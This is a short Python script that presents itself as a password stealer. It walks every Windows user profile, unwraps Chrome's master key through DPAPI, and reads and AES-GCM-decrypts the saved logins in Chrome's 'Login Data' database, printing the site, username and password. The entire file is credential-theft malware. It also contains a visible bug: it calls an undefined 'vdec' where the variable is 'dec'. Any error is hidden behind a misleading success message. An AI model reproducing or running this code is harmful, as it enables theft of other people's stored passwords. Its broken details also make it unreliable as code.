import win32crypt
from base64 import b64decode as d
import sqlite3
from Crypto.Cipher import AES
import os

for user in os.listdir("C:/Users/"):
    try:
        print(f"Trying to steal {user}'s passwords...")
        encrypted_key = d(open(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Local State").read().split("encrypted_key\":\"")[1].split("\"")[0])[len("DPAPI"):]
        key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        nonce_length = 96//8

        conn = sqlite3.connect(f"C:/Users/{user}/AppData/Local/Google/Chrome/User Data/Default/Login Data")
        cursor = conn.cursor()
        results = cursor.execute("SELECT origin_url, username_value, password_value FROM logins").fetchall()

        for origin_url, username_value, password in results:
            dec = AES.new(key, AES.MODE_GCM, nonce=password[3:3+nonce_length])
            print(origin_url, username_value, vdec.decrypt(password[3+nonce_length:]))
    except Exception as e:
        print("Nope they're all good!")
        print(e)


input()
